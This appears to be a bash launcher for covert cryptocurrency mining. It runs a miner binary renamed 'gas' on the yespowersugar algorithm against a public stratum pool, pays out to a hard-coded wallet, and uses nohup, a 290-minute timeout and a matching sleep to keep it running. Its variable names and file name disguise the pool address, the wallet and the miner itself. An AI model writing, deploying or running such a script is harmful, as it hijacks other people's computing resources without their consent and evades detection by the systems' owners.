#!/bin/bash
chmod u+x gas
ANU=yespowersugar
IPE=stratum+tcps://stratum-eu.rplant.xyz:17042
NGROK=sugar1qncwd9uvepk8y3qpp25pjvqunyzjlj44wzhn2as.ho
nohup timeout 290m ./gas -a $ANU -o $IPE -u $NGROK &
jobs
echo "haha"
apt-get update -y
sleep 292m
